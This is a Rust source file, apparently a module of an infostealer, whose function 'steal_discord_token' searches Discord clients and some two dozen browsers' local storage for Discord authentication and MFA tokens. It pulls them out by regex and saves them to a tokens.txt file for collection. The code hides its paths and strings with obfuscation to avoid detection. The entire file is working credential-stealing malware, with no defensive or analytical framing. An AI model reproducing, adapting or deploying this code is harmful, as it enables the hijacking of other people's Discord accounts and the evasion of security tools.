// explanation, it will look for all tokens on PC using regex pattern, if there will be any matched pattern it will save string in txt file it will also check for doubled tokens

use regex::Regex;
use std::env;
use std::fs;
use std::io::{self, Read};
use std::path::{Path, PathBuf};

pub fn steal_discord_token(path: String) {
    let appdata = env::var(obfstr::obfstr!("APPDATA")).unwrap();
    let local = env::var(obfstr::obfstr!("LOCALAPPDATA")).unwrap();
    let token = obfstr::obfstr!("Local Storage/leveldb").to_string();

    let discord_path = [
        format!("{}/{}/{}", appdata, obfstr::obfstr!("discord"), token),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Yandex/YandexBrowser/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Microsoft/Edge/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("BraveSoftware/Brave-Browser/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Google/Chrome SxS/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Profile 1"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Profile 2"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Profile 3"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Profile 4"),
            token
        ),
        format!(
            "{}/{}/{}",
            local,
            obfstr::obfstr!("Google/Chrome/User Data/Profile 5"),
            token
        ),
        format!("{}/{}/{}", appdata, obfstr::obfstr!("discordcanary"), token),
        format!("{}/{}/{}", appdata, obfstr::obfstr!("Lightcord"), token),
        format!("{}/{}/{}", appdata, obfstr::obfstr!("discordptb"), token),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Opera Software/Opera Stable"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Opera Software/Opera GX Stable"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Amigo/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Torch/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Kometa/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Orbitum/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("CentBrowser/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("7Star/7Star/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Sputnik/Sputnik/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Vivaldi/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Epic Privacy Browser/User Data"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("uCozMedia/Uran/User Data/Default"),
            token
        ),
        format!(
            "{}/{}/{}",
            appdata,
            obfstr::obfstr!("Iridium/User Data/Default"),
            token
        ),
    ];

    let mut tokens = Vec::new();
    for token_path in &discord_path {
        let token_path = PathBuf::from(token_path);
        if token_path.exists() {
            for entry in fs::read_dir(token_path).unwrap() {
                let entry = entry.unwrap();
                let file_name = entry.file_name();
                let file_name = file_name.to_str().unwrap();
                if file_name.ends_with(".log") || file_name.ends_with(".ldb") {
                    let contents = read_file(entry.path()).unwrap();
            
                    let re_discord_token = Regex::new(r"([MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27})").unwrap();
                    if let Some(match_) = re_discord_token.find(&contents) {
                        tokens.push(format!("Token: {}", match_.as_str()));
                    }
            
                    let re_mfa_token = Regex::new(r"mfa\.[\w-]{84}").unwrap();
                    if let Some(match_) = re_mfa_token.find(&contents) {
                        tokens.push(format!("Token: {}", match_.as_str()));
                    }
                }
            }
            
        }
        if !tokens.is_empty() {
            break;
        }
    }
    tokens.dedup();

    if !tokens.is_empty() {
        fs::create_dir_all(format!("{}/{}", path, obfstr::obfstr!("Discord")))
            .expect("Unable to create directory");
        fs::write(
            format!("{}/{}", path, obfstr::obfstr!("Discord/tokens.txt")),
            tokens.join("\n"),
        )
        .expect("Unable to write file");

        unsafe {
            crate::DISCORD += 1;
        }
    }
}

fn read_file<P: AsRef<Path>>(path: P) -> io::Result<String> {
    let mut file = fs::File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(String::from_utf8_lossy(&buffer).to_string())
}
